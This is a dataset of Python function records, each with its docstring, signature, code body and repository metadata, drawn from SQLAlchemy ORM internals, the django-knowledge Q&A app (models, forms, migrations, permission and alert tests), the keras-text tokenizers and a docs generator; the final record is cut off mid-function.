{"docstring": "\"\"\"Annotate the primaryjoin and secondaryjoin\nstructures with 'remote' annotations marking columns\nconsidered as part of the 'remote' side.\n\n\"\"\"\n", "func_signal": "def _annotate_remote(self):\n", "code": "if self._has_remote_annotations:\n    return\n\nif self.secondary is not None:\n    self._annotate_remote_secondary()\nelif self._local_remote_pairs or self._remote_side:\n    self._annotate_remote_from_args()\nelif self._refers_to_parent_table():\n    self._annotate_selfref(lambda col: \"foreign\" in col._annotations, False)\nelif self._tables_overlap():\n    self._annotate_remote_with_overlap()\nelse:\n    self._annotate_remote_distinct_selectables()", "path": "sqlalchemy\\orm\\relationships.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
{"docstring": "\"\"\"Numbering function: consecutive integers starting at arbitrary start.\"\"\"\n\n", "func_signal": "def count_from_n_factory(start):\n", "code": "def f(index, collection):\n    return index + start\ntry:\n    f.__name__ = 'count_from_%i' % start\nexcept TypeError:\n    pass\nreturn f", "path": "sqlalchemy\\ext\\orderinglist.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
{"docstring": "\"\"\"Implement the ``==`` operator.\n\nIn a many-to-one context, such as::\n\n  MyClass.some_prop == <some object>\n\nthis will typically produce a\nclause such as::\n\n  mytable.related_id == <some id>\n\nWhere ``<some id>`` is the primary key of the given\nobject.\n\nThe ``==`` operator provides partial functionality for non-\nmany-to-one comparisons:\n\n* Comparisons against collections are not supported.\n  Use :meth:`~.RelationshipProperty.Comparator.contains`.\n* Compared to a scalar one-to-many, will produce a\n  clause that compares the target columns in the parent to\n  the given target.\n* Compared to a scalar many-to-many, an alias\n  of the association table will be rendered as\n  well, forming a natural join that is part of the\n  main body of the query. This will not work for\n  queries that go beyond simple AND conjunctions of\n  comparisons, such as those which use OR. Use\n  explicit joins, outerjoins, or\n  :meth:`~.RelationshipProperty.Comparator.has` for\n  more comprehensive non-many-to-one scalar\n  membership tests.\n* Comparisons against ``None`` given in a one-to-many\n  or many-to-many context produce a NOT EXISTS clause.\n\n\"\"\"\n", "func_signal": "def __eq__(self, other):\n", "code": "if isinstance(other, (util.NoneType, expression.Null)):\n    if self.property.direction in [ONETOMANY, MANYTOMANY]:\n        return ~self._criterion_exists()\n    else:\n        return _orm_annotate(self.property._optimized_compare(\n            None, adapt_source=self.adapter))\nelif self.property.uselist:\n    raise sa_exc.InvalidRequestError(\n        \"Can't compare a collection to an object or collection; \"\n        \"use contains() to test for membership.\")\nelse:\n    return _orm_annotate(\n        self.property._optimized_compare(\n            other, adapt_source=self.adapter))", "path": "sqlalchemy\\orm\\relationships.py", "repo_name": "ring04h/wyportmap", "stars": 366, "license": "None", "language": "python", "size": 1885}
{"docstring": "# Deleting model 'Category'\n", "func_signal": "def backwards(self, orm):\n", "code": "        db.delete_table('knowledge_category')\n\n        # Deleting model 'Question'\n        db.delete_table('knowledge_question')\n\n        # Removing M2M table for field categories on 'Question'\n        db.delete_table('knowledge_question_categories')\n\n        # Deleting model 'Response'\n        db.delete_table('knowledge_response')", "path": "knowledge\\migrations\\0001_initial.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "\"\"\"\nReturns a boolean dictating if a User like instance can\nview the current Model instance.\n\"\"\"\n\n", "func_signal": "def can_view(self, user):\n", "code": "if self.status == 'inherit' and self.is_response:\n    return self.question.can_view(user)\n\nif self.status == 'internal' and user.is_staff:\n    return True\n\nif self.status == 'private':\n    if self.user == user or user.is_staff:\n        return True\n    if self.is_response and self.question.user == user:\n        return True\n\nif self.status == 'public':\n    return True\n\nreturn False", "path": "knowledge\\models.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "# the auto generated question tests are private by default\n", "func_signal": "def test_question_qs(self):\n", "code": "self.assertEquals(0, Q.can_view(self.anon).count())\nself.assertEquals(0, Q.can_view(self.bob).count())\n\nself.assertEquals(1, Q.can_view(self.joe).count())\nself.assertEquals(1, Q.can_view(self.admin).count())\n\n\n## someone comes along and publicizes this question ##\nself.question.public()\n\n# everyone can see\nself.assertEquals(1, Q.can_view(self.anon).count())\nself.assertEquals(1, Q.can_view(self.bob).count())\nself.assertEquals(1, Q.can_view(self.joe).count())\nself.assertEquals(1, Q.can_view(self.admin).count())\n\n\n## someone comes along and privatizes this question ##\nself.question.private()\n\nself.assertEquals(0, Q.can_view(self.anon).count())\nself.assertEquals(0, Q.can_view(self.bob).count())\n\nself.assertEquals(1, Q.can_view(self.joe).count())\nself.assertEquals(1, Q.can_view(self.admin).count())", "path": "tests\\mock\\tests\\managers.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "\"\"\"\nGiven a question asked by a real user, track answering and accepted states.\n\"\"\"\n\n## joe asks a question ##\n", "func_signal": "def test_basic_question_answering(self):\n", "code": "question = Question.objects.create(\n    user = self.joe,\n    title = 'What time is it?',\n    body = 'Whenever I look at my watch I see the little hand at 3 and the big hand at 7.'\n)\n\nself.assertFalse(question.answered())\nself.assertFalse(question.accepted())\n\n## admin responds ##\nresponse = Response.objects.create(\n    question = question,\n    user = self.admin,\n    body = 'The little hand at 3 means 3 pm or am, the big hand at 7 means 3:35 am or pm.'\n)\n\nself.assertTrue(question.answered())\nself.assertFalse(question.accepted())\n\n\n## joe accepts the answer ##\nquestion.accept(response)\n\nself.assertTrue(question.answered())\nself.assertTrue(question.accepted())\nself.assertIn('accept', response.states())\n\n## someone clears the accepted answer ##\nquestion.accept()\n\nself.assertFalse(question.accepted())\n\nresponse = Response.objects.get(id=response.id) # reload\nself.assertNotIn('accept', response.states())\n\n## someone used the response accept shortcut ##\nresponse.accept()\n\nquestion = Question.objects.get(id=question.id) # reload\nself.assertTrue(question.answered())\nself.assertTrue(question.accepted())\nself.assertIn('accept', response.states())", "path": "tests\\mock\\tests\\models.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "\"\"\"\nEnsures adding another response isn't crossed into other responses.\n\"\"\"\n", "func_signal": "def test_get_responses(self):\n", "code": "self.assertEquals(len(self.question.get_responses(self.anon)), 0)\nself.assertEquals(len(self.question.get_responses(self.joe)), 1)\nself.assertEquals(len(self.question.get_responses(self.admin)), 1)\n\nquestion = Question.objects.create(\n    title = 'Where is my cat?',\n    body = 'His name is whiskers.',\n    user = self.joe\n)\nresponse = Response.objects.create(\n    question = question,\n    user = self.admin,\n    body = 'I saw him in the backyard.'\n)\n\nself.assertEquals(len(self.question.get_responses(self.anon)), 0)\nself.assertEquals(len(self.question.get_responses(self.joe)), 1)\nself.assertEquals(len(self.question.get_responses(self.admin)), 1)\n\nself.assertEqual(len(mail.outbox), 0)", "path": "tests\\mock\\tests\\models.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "# test the default for anonymous in tests/settings.py...\n", "func_signal": "def test_form_question_status(self):\n", "code": "form = QuestionForm(self.joe)\nself.assertIn('status', form.fields.keys())\n\n# internal is only selectable for admins\nQUESTION_POST = {\n    'title': 'This is a title friend!',\n    'body': 'This is the body friend!',\n    'status': 'internal'\n}\n\nself.assertFalse(QuestionForm(self.joe, QUESTION_POST).is_valid())\nself.assertTrue(QuestionForm(self.admin, QUESTION_POST).is_valid())\n\nQUESTION_POST = {\n    'title': 'This is a title friend!',\n    'body': 'This is the body friend!',\n    'status': 'public'\n}\nquestion = QuestionForm(self.joe, QUESTION_POST).save()\nself.assertEquals(question.status, 'public')", "path": "tests\\mock\\tests\\forms.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "## joe asks a question ##\n", "func_signal": "def test_switching_response(self):\n", "code": "response = self.response\nself.assertEquals(response.status, 'inherit')\nself.assertIn('inherit', response.states())\n\nresponse.public()\nself.assertEquals(response.status, 'public')\nself.assertIn('public', response.states())\n\nresponse.internal()\nself.assertEquals(response.status, 'internal')\nself.assertIn('internal', response.states())\n\nresponse.private()\nself.assertEquals(response.status, 'private')\nself.assertIn('private', response.states())\n\nresponse.inherit()\nself.assertEquals(response.status, 'inherit')\nself.assertIn('inherit', response.states())", "path": "tests\\mock\\tests\\models.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "\"\"\"\nWalk through the public, private and internal states for Question, and public, private,\ninherit and internal states for Response.\n\nThen checks who can see what with .can_view(<User>).\n\"\"\"\n\n## joe asks a question ##\n", "func_signal": "def test_private_states(self):\n", "code": "question = self.question\n\nself.assertFalse(question.can_view(self.anon))\nself.assertFalse(question.can_view(self.bob))\n\nself.assertTrue(question.can_view(self.joe))\nself.assertTrue(question.can_view(self.admin))\n\n\n## someone comes along and publicizes this question ##\nquestion.public()\n\n# everyone can see\nself.assertTrue(question.can_view(self.anon))\nself.assertTrue(question.can_view(self.bob))\n\nself.assertTrue(question.can_view(self.joe))\nself.assertTrue(question.can_view(self.admin))\n\n\n## someone comes along and privatizes this question ##\nquestion.private()\n\nself.assertFalse(question.can_view(self.anon))\nself.assertFalse(question.can_view(self.bob))\n\nself.assertTrue(question.can_view(self.joe))\nself.assertTrue(question.can_view(self.admin))\n\n\n## admin responds ##\nresponse = self.response\nresponse.inherit()\n\nself.assertFalse(response.can_view(self.anon))\nself.assertFalse(response.can_view(self.bob))\n\nself.assertTrue(response.can_view(self.joe))\nself.assertTrue(response.can_view(self.admin))\n\n\n## someone comes along and publicizes the parent question ##\nquestion.public()\n\nself.assertTrue(response.can_view(self.anon))\nself.assertTrue(response.can_view(self.bob))\nself.assertTrue(response.can_view(self.joe))\nself.assertTrue(response.can_view(self.admin))\n\n\n## someone privatizes the response ##\nresponse.private()\n\n# everyone can see question still\nself.assertTrue(question.can_view(self.anon))\nself.assertTrue(question.can_view(self.bob))\nself.assertTrue(question.can_view(self.joe))\nself.assertTrue(question.can_view(self.admin))\n\n# only joe and admin can see the response though\nself.assertFalse(response.can_view(self.anon))\nself.assertFalse(response.can_view(self.bob))\n\nself.assertTrue(response.can_view(self.joe))\nself.assertTrue(response.can_view(self.admin))\n\n\n## someone internalizes the response ##\nresponse.internal()\n\n# everyone can see question still\nself.assertTrue(question.can_view(self.anon))\nself.assertTrue(question.can_view(self.bob))\nself.assertTrue(question.can_view(self.joe))\nself.assertTrue(question.can_view(self.admin))\n\n# only admin can see the response though\nself.assertFalse(response.can_view(self.anon))\nself.assertFalse(response.can_view(self.bob))\nself.assertFalse(response.can_view(self.joe))\n\nself.assertTrue(response.can_view(self.admin))", "path": "tests\\mock\\tests\\models.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "\"\"\"\nGet local name, then self.user's first/last, and finally\ntheir username if all else fails.\n\"\"\"\n", "func_signal": "def get_name(self):\n", "code": "name = (self.name or (self.user and (\n    u'{0} {1}'.format(self.user.first_name, self.user.last_name).strip()\\\n    or self.user.username\n)))\nreturn name.strip() or _(\"Anonymous\")", "path": "knowledge\\models.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "## joe asks a question ##\n", "func_signal": "def test_switching_question(self):\n", "code": "question = self.question\nself.assertEquals(question.status, 'private')\nself.assertIn('private', question.states())\n\nquestion.public()\nself.assertEquals(question.status, 'public')\nself.assertIn('public', question.states())\n\nquestion.private()\nself.assertEquals(question.status, 'private')\nself.assertIn('private', question.states())\n\n# no change\nquestion.inherit()\nself.assertEquals(question.status, 'private')\nself.assertIn('private', question.states())\nquestion.internal()\nself.assertEquals(question.status, 'private')\nself.assertIn('private', question.states())", "path": "tests\\mock\\tests\\models.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "# Adding model 'Category'\n", "func_signal": "def forwards(self, orm):\n", "code": "        db.create_table('knowledge_category', (\n            ('id', self.gf('django.db.models.fields.AutoField')(primary_key=True)),\n            ('added', self.gf('django.db.models.fields.DateTimeField')(auto_now_add=True, blank=True)),\n            ('lastchanged', self.gf('django.db.models.fields.DateTimeField')(auto_now=True, blank=True)),\n            ('title', self.gf('django.db.models.fields.CharField')(max_length=255)),\n            ('slug', self.gf('django.db.models.fields.SlugField')(max_length=50, db_index=True)),\n        ))\n        db.send_create_signal('knowledge', ['Category'])\n\n        # Adding model 'Question'\n        db.create_table('knowledge_question', (\n            ('id', self.gf('django.db.models.fields.AutoField')(primary_key=True)),\n            ('added', self.gf('django.db.models.fields.DateTimeField')(auto_now_add=True, blank=True)),\n            ('lastchanged', self.gf('django.db.models.fields.DateTimeField')(auto_now=True, blank=True)),\n            ('user', self.gf('django.db.models.fields.related.ForeignKey')(to=orm[user_model_label], null=True, blank=True)),\n            ('name', self.gf('django.db.models.fields.CharField')(max_length=64, null=True, blank=True)),\n            ('email', self.gf('django.db.models.fields.EmailField')(max_length=75, null=True, blank=True)),\n            ('title', self.gf('django.db.models.fields.CharField')(max_length=255)),\n            ('body', self.gf('django.db.models.fields.TextField')(null=True, blank=True)),\n            ('status', self.gf('django.db.models.fields.CharField')(default='private', max_length=32, db_index=True)),\n            ('locked', self.gf('django.db.models.fields.BooleanField')(default=False)),\n        ))\n        db.send_create_signal('knowledge', ['Question'])\n\n        # Adding M2M table for field categories on 'Question'\n        db.create_table('knowledge_question_categories', (\n            ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True)),\n            ('question', models.ForeignKey(orm['knowledge.question'], null=False)),\n            ('category', models.ForeignKey(orm['knowledge.category'], null=False))\n        ))\n        db.create_unique('knowledge_question_categories', ['question_id', 'category_id'])\n\n        # Adding model 'Response'\n        db.create_table('knowledge_response', (\n            ('id', self.gf('django.db.models.fields.AutoField')(primary_key=True)),\n            ('added', self.gf('django.db.models.fields.DateTimeField')(auto_now_add=True, blank=True)),\n            ('lastchanged', self.gf('django.db.models.fields.DateTimeField')(auto_now=True, blank=True)),\n            ('user', self.gf('django.db.models.fields.related.ForeignKey')(to=orm[user_model_label], null=True, blank=True)),\n            ('name', self.gf('django.db.models.fields.CharField')(max_length=64, null=True, blank=True)),\n            ('email', self.gf('django.db.models.fields.EmailField')(max_length=75, null=True, blank=True)),\n            ('question', self.gf('django.db.models.fields.related.ForeignKey')(related_name='responses', to=orm['knowledge.Question'])),\n            ('body', self.gf('django.db.models.fields.TextField')(null=True, blank=True)),\n            ('status', self.gf('django.db.models.fields.CharField')(default='inherit', max_length=32, db_index=True)),\n            ('accepted', self.gf('django.db.models.fields.BooleanField')(default=False)),\n        ))\n        db.send_create_signal('knowledge', ['Response'])", "path": "knowledge\\migrations\\0001_initial.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "\"\"\"\nGiven a response, make that the one and only accepted answer.\nSimilar to StackOverflow.\n\"\"\"\n", "func_signal": "def accept(self, response=None):\n", "code": "self.clear_accepted()\n\nif response and response.question == self:\n    response.accepted = True\n    response.save()\n    return True\nelse:\n    return False", "path": "knowledge\\models.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "# the auto generated response tests are inherit \n# (private by question's status) by default\n", "func_signal": "def test_generic_response_qs(self):\n", "code": "self.assertEquals(0, R.can_view(self.anon).count())\nself.assertEquals(0, R.can_view(self.bob).count())\n\nself.assertEquals(1, R.can_view(self.joe).count())\nself.assertEquals(1, R.can_view(self.admin).count())\n\n\n## someone comes along and publicizes this response ##\nself.response.public()\n\n# everyone can see\nself.assertEquals(1, R.can_view(self.anon).count())\nself.assertEquals(1, R.can_view(self.bob).count())\nself.assertEquals(1, R.can_view(self.joe).count())\nself.assertEquals(1, R.can_view(self.admin).count())\n\n\n## someone comes along and internalizes this response ##\nself.response.internal()\n\n# only admin can see\nself.assertEquals(0, R.can_view(self.anon).count())\nself.assertEquals(0, R.can_view(self.bob).count())\nself.assertEquals(0, R.can_view(self.joe).count())\n\nself.assertEquals(1, R.can_view(self.admin).count())\n\n\n## someone comes along and privatizes this response ##\nself.response.private()\n\nself.assertEquals(0, R.can_view(self.anon).count())\nself.assertEquals(0, R.can_view(self.bob).count())\n\nself.assertEquals(1, R.can_view(self.joe).count())\nself.assertEquals(1, R.can_view(self.admin).count())", "path": "tests\\mock\\tests\\managers.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "\"\"\"\nBuild and return the appropriate form depending\non the status of the passed in user and question.\n\"\"\"\n\n", "func_signal": "def ResponseForm(user, question, *args, **kwargs):\n", "code": "if question.locked:\n    return None\n\nif not settings.FREE_RESPONSE and not \\\n        (user.is_staff or question.user == user):\n    return None\n\nif user.is_anonymous():\n    if not settings.ALLOW_ANONYMOUS:\n        return None\n    else:\n        selected_fields = ['name', 'email']\nelse:\n    selected_fields = ['user']\n\nselected_fields += ['body', 'question']\n\nif user.is_staff:\n    selected_fields += ['status']\n\nif settings.ALERTS:\n    selected_fields += ['alert']\n\nclass _ResponseForm(forms.ModelForm):\n    def __init__(self, *args, **kwargs):\n        super(_ResponseForm, self).__init__(*args, **kwargs)\n\n        for key in self.fields:\n            if not key in OPTIONAL_FIELDS:\n                self.fields[key].required = True\n\n        # a bit of a hack...\n        for key in ['user', 'question']:\n            qf = self.fields.get(key, None)\n            if qf:\n                qf.widget = qf.hidden_widget()\n                qf.required = False\n\n    # honey pot!\n    phone_number = forms.CharField(required=False)\n\n    def clean_user(self):\n        return user\n\n    def clean_question(self):\n        return question\n\n    class Meta:\n        model = Response\n        fields = selected_fields\n\nreturn _ResponseForm(*args, **kwargs)", "path": "knowledge\\forms.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "\"\"\"\nBug mentioned in issue #25.\n\"\"\"\n", "func_signal": "def test_get_public_responses(self):\n", "code": "question = Question.objects.create(\n    title = 'Where is my cat?',\n    body = 'His name is whiskers.',\n    user = self.joe,\n    status = 'public'\n\n)\nresponse = Response.objects.create(\n    question = question,\n    user = self.admin,\n    body = 'I saw him in the backyard.',\n    status = 'inherit'\n)\n\nself.assertEquals(len(question.get_responses(self.anon)), 1)\nself.assertEquals(len(question.get_responses(self.joe)), 1)\nself.assertEquals(len(question.get_responses(self.admin)), 1)\n\nself.assertEqual(len(mail.outbox), 0)", "path": "tests\\mock\\tests\\models.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "\"\"\"\nOne question by joe, one response by admin: joe responds.\n\"\"\"\n", "func_signal": "def test_sending_alerts_remove_self(self):\n", "code": "self.assertTrue(settings.ALERTS)\n\nself.assertEqual(len(mail.outbox), 0)\n\nRESPONSE_POST = {\n    'body': 'This is the response body friend!',\n    'alert': settings.ALERTS,\n}\n\n# question is by joe, first response is by admin\nform = ResponseForm(self.joe, self.question, RESPONSE_POST)\nself.assertTrue(form.is_valid())\nresponse = form.save()\n\nself.assertTrue(response.alert)\nself.assertEqual(len(mail.outbox), 1) # one for admin (not joe!)", "path": "tests\\mock\\tests\\signals.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "\"\"\"\nOne question by joe, two responses by admin: bob responds.\n\"\"\"\n######## SETUP\n", "func_signal": "def test_sending_alerts_dedupe(self):\n", "code": "self.assertTrue(settings.ALERTS)\n\nRESPONSE_POST = {\n    'body': 'This is the response body friend!',\n    'status': 'inherit',\n    'alert': settings.ALERTS,\n}\n\n# another admin response\nresponse = ResponseForm(self.admin, self.question, RESPONSE_POST).save()\n\nmail.outbox = [] # reset\nself.assertEqual(len(mail.outbox), 0)\n######## TEARDOWN\n\nRESPONSE_POST = {\n    'body': 'This is the response body friend!',\n    'alert': settings.ALERTS,\n}\n\n# question is by joe, first response is by admin\nform = ResponseForm(self.bob, self.question, RESPONSE_POST)\nself.assertTrue(form.is_valid())\nresponse = form.save()\n\nself.assertTrue(response.alert)\nself.assertEqual(len(mail.outbox), 2) # one for joe, one for admin", "path": "tests\\mock\\tests\\signals.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "\"\"\"\nBuild and return the appropriate form depending\non the status of the passed in user.\n\"\"\"\n\n", "func_signal": "def QuestionForm(user, *args, **kwargs):\n", "code": "if user.is_anonymous():\n    if not settings.ALLOW_ANONYMOUS:\n        return None\n    else:\n        selected_fields = ['name', 'email', 'title', 'body']\nelse:\n    selected_fields = ['user', 'title', 'body', 'status']\n\nif settings.ALERTS:\n    selected_fields += ['alert']\n\nclass _QuestionForm(forms.ModelForm):\n    def __init__(self, *args, **kwargs):\n        super(_QuestionForm, self).__init__(*args, **kwargs)\n\n        for key in self.fields:\n            if not key in OPTIONAL_FIELDS:\n                self.fields[key].required = True\n\n        # hide the internal status for non-staff\n        qf = self.fields.get('status', None)\n        if qf and not user.is_staff:\n            choices = list(qf.choices)\n            choices.remove(('internal', _('Internal')))\n            qf.choices = choices\n\n        # a bit of a hack...\n        # hide a field, and use clean to force\n        # a specific value of ours\n        for key in ['user']:\n            qf = self.fields.get(key, None)\n            if qf:\n                qf.widget = qf.hidden_widget()\n                qf.required = False\n\n    # honey pot!\n    phone_number = forms.CharField(required=False)\n\n    def clean_user(self):\n        return user\n\n    class Meta:\n        model = Question\n        fields = selected_fields\n\nreturn _QuestionForm(*args, **kwargs)", "path": "knowledge\\forms.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "\"\"\"\nOne question by joe, one response by admin: bob responds.\n\"\"\"\n", "func_signal": "def test_sending_alerts_normal(self):\n", "code": "self.assertTrue(settings.ALERTS)\n\nself.assertEqual(len(mail.outbox), 0)\n\nRESPONSE_POST = {\n    'body': 'This is the response body friend!',\n    'alert': settings.ALERTS,\n}\n\n# question is by joe, first response is by admin\nform = ResponseForm(self.bob, self.question, RESPONSE_POST)\nself.assertTrue(form.is_valid())\nresponse = form.save()\n\nself.assertTrue(response.alert)\nself.assertEqual(len(mail.outbox), 2) # one for joe, one for admin", "path": "tests\\mock\\tests\\signals.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "\"\"\"\n    recipes = Recipe.objects.all()\n    paginator, recipes = paginate(recipes, 12,\n        request.GET.get('page', '1'))\n\"\"\"\n", "func_signal": "def paginate(iterable, per_page, page_num):\n", "code": "from django.core.paginator import Paginator, InvalidPage, EmptyPage\n\npaginator = Paginator(iterable, per_page)\n\ntry:\n    page = int(page_num)\nexcept ValueError:\n    page = 1\n\ntry:\n    iterable = paginator.page(page)\nexcept (EmptyPage, InvalidPage):\n    iterable = paginator.page(paginator.num_pages)\n\nreturn paginator, iterable", "path": "knowledge\\utils.py", "repo_name": "zapier/django-knowledge", "stars": 489, "license": "isc", "language": "python", "size": 1033}
{"docstring": "\"\"\"Updates `test_indices` property with indices of `test_size` proportion.\n\nArgs:\n    test_size: The test proportion in [0, 1] (Default value: 0.1)\n\"\"\"\n", "func_signal": "def update_test_indices(self, test_size=0.1):\n", "code": "if self.is_multi_label:\n    self._train_indices, self._test_indices = sampling.multi_label_train_test_split(self.y, test_size)\nelse:\n    sss = StratifiedShuffleSplit(n_splits=1, test_size=test_size)\n    self._train_indices, self._test_indices = next(sss.split(self.X, self.y))", "path": "keras_text\\data.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "\"\"\"Builds an embedding matrix for all words in vocab using embeddings_index\n\"\"\"\n", "func_signal": "def build_embedding_weights(word_index, embeddings_index):\n", "code": "logger.info('Loading embeddings for all words in the corpus')\nembedding_dim = embeddings_index.values()[0].shape[-1]\n\n# +1 since tokenizer words are indexed from 1. 0 is reserved for padding and unknown words.\nembedding_weights = np.zeros((len(word_index) + 1, embedding_dim))\n\nfor word, i in word_index.items():\n    word_vector = embeddings_index.get(word)\n    if word_vector is not None:\n        # Words not in embedding will be all zeros which can stand for padded words.\n        embedding_weights[i] = word_vector\n\nreturn embedding_weights", "path": "keras_text\\embeddings.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "\"\"\"Yields tokens from texts as `(text_idx, sent_idx, character)`\n\nArgs:\n    texts: The list of texts.\n    **kwargs: Supported args include:\n        n_threads/num_threads: Number of threads to use. Uses num_cpus - 1 by default.\n        batch_size: The number of texts to accumulate into a common working set before processing.\n            (Default value: 1000)\n\"\"\"\n# Perf optimization. Only process what is necessary.\n", "func_signal": "def token_generator(self, texts, **kwargs):\n", "code": "n_threads, batch_size = _parse_spacy_kwargs(**kwargs)\nnlp = spacy.load(self.lang)\n\nkwargs = {\n    'batch_size': batch_size,\n    'n_threads': n_threads,\n    'disable': ['ner']\n}\n\n# Perf optimization: Lower the entire text instead of individual tokens.\ntexts_gen = _apply_generator(texts, lambda x: x.lower()) if self.lower else texts\nfor text_idx, doc in enumerate(nlp.pipe(texts_gen, **kwargs)):\n    for sent_idx, sent in enumerate(doc.sents):\n        for word in sent:\n            for char in word:\n                yield text_idx, sent_idx, char", "path": "keras_text\\processing.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "\"\"\"Generates train and validation sets from the training indices.\n\nArgs:\n    split_ratio: The split proportion in [0, 1] (Default value: 0.1)\n\nReturns:\n    The stratified train and val subsets. Multi-label outputs are handled as well.\n\"\"\"\n", "func_signal": "def train_val_split(self, split_ratio=0.1):\n", "code": "if self.is_multi_label:\n    train_indices, val_indices = sampling.multi_label_train_test_split(self.y, split_ratio)\nelse:\n    sss = StratifiedShuffleSplit(n_splits=1, test_size=split_ratio)\n    train_indices, val_indices = next(sss.split(self.X, self.y))\nreturn self.X[train_indices], self.X[val_indices], self.y[train_indices], self.y[val_indices]", "path": "keras_text\\data.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "\"\"\"Yields tokens from texts as `(text_idx, sent_idx, word)`\n\nArgs:\n    texts: The list of texts.\n    **kwargs: Supported args include:\n        n_threads/num_threads: Number of threads to use. Uses num_cpus - 1 by default.\n        batch_size: The number of texts to accumulate into a common working set before processing.\n            (Default value: 1000)\n\"\"\"\n# Perf optimization. Only process what is necessary.\n", "func_signal": "def token_generator(self, texts, **kwargs):\n", "code": "n_threads, batch_size = _parse_spacy_kwargs(**kwargs)\nnlp = spacy.load(self.lang)\n\ndisabled = []\nif len(self.exclude_entities) > 0:\n    disabled.append('ner')\n\nkwargs = {\n    'batch_size': batch_size,\n    'n_threads': n_threads,\n    'disable': disabled\n}\n\nfor text_idx, doc in enumerate(nlp.pipe(texts, **kwargs)):\n    for sent_idx, sent in enumerate(doc.sents):\n        for word in sent:\n            processed_word = self._apply_options(word)\n            if processed_word is not None:\n                yield text_idx, sent_idx, processed_word", "path": "keras_text\\processing.py", "repo_name": "raghakot/keras-text", "stars": 423, "license": "mit", "language": "python", "size": 12114}
{"docstring": "\"\"\"Takes a function (or method) and documents it.\n\nArgs:\n    clsname (str, optional): class name to prepend to funcname.\n    depth (int, optional): number of ### to append to function name\n\n\"\"\"\n", "func_signal": "def func2md(self, func, clsname=None, names=None, depth=3):\n", "code": "section = \"#\" * depth\nif names is None:\n    names = [func.__name__]\n\nfuncname = \", \".join(names)\nescfuncname = \", \".join([\"`%s`\" % funcname if funcname.startswith(\"_\") else funcname for funcname in names])\nheader = \"%s%s\" % (\"%s.\" % clsname if clsname else \"\", escfuncname)\n\npath = self.get_src_path(func)\ndoc = self.doc2md(func)\n\nargs, kwargs = [], []\nspec = getargspec(func)\nvargsname, kwargsname = spec.varargs, spec.keywords\nvargs = list(make_iter(spec.args)) if spec.args else []\ndefaults = list(make_iter(spec.defaults)) if spec.defaults else []\n\nwhile vargs:\n    if vargs and vargs[0] == \"self\":\n        args.append(vargs.pop(0))\n    elif len(vargs) > len(defaults):\n        args.append(vargs.pop(0))\n    else:\n        default = defaults.pop(0)\n        if isinstance(default, str):\n            default = \"\\\"%s\\\"\" % default\n        else:\n            default = \"%s\" % str(default)\n\n        kwargs.append((vargs.pop(0), default))\n\nif args:\n    args = \", \".join(\"%s\" % arg for arg in args)\nif kwargs:\n    kwargs = \", \".join(\"%s=%s\" % kwarg for kwarg in kwargs)\n    if args:\n        kwargs = \", \" + kwargs\nif vargsname:\n    vargsname = \"*%s\" % vargsname\n    if args or kwargs:\n        vargsname = \", \" + vargsname\nif kwargsname:\n    kwargsname = \"**%s\" % kwargsname\n    if args or kwargs or vargsname:\n        kwargsname = \", \" + kwargsname\n\n_FUNCDEF = \"{funcname}({args}{kwargs}{vargs}{vkwargs})\"\nfuncdef = _FUNCDEF.format(funcname=funcname,\n                          args=args or \"\",\n                          kwargs=kwargs or \"\",\n                          vargs=vargsname or \"\",\n                          vkwargs=kwargsname or \"\")\n\n# split the function definition if it is too long\nlmax = 90\nif len(funcdef) > lmax:\n    # wrap in the args list\n    split = funcdef.split(\"(\", 1)\n    # we gradually build the string again\n    rest = split[1]\n    args = rest.split(\", \")\n\n    funcname = \"(\".join(split[:1]) + \"(\"\n    lline = len(funcname)\n    parts = []\n    for arg in args:\n        larg = len(arg)\n        if larg > lmax - 5:\n            # not much to do if arg is so long\n            parts.append(arg)\n        elif lline + larg > lmax:\n            # the next arg is too long, break the line\n            parts.append(\"\\\\\\n    \" + arg)\n            lline = 0\n        else:\n            parts.append(arg)\n        lline += len(parts[-1])\n    funcdef = funcname + \", \".join(parts)\n\n# build the signature\nstring = FUNC_TEMPLATE.format(section=section,\n                              